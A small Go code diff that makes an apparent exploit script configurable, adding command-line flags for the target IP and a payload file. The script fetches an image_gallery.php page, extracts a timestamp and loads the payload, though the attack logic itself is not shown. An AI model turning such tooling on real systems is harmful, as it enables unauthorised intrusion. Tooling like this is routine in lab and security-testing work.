@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"github.com/spf13/pflag"
 	"io"
 	"net/http"
 	"os"
@@ -11,8 +12,12 @@ import (
 	"strings"
 )
 
+var ipAddr = pflag.StringP("ipAddr", "i", "192.168.1.7", "Input ip address")
+var payloadTxt = pflag.StringP("payloadTxt", "p", "payload.txt", "Input payload file name")
+
 func main() {
-	url := "http://192.168.1.7/image_gallery.php"
+	pflag.Parse()
+	url := "http://" + *ipAddr + "/image_gallery.php"
 	response, err := http.Get(url)
 	if err != nil {
 		fmt.Println(err)
@@ -22,7 +27,7 @@ func main() {
 	timeStamp := findMustCompile(body)[0][1]
 	fmt.Println("time stamp:", string(timeStamp))
 
-	f, err := os.Open("payload.txt")
+	f, err := os.Open(*payloadTxt)
 	if err != nil {
 		fmt.Println("err:", err)
 		return
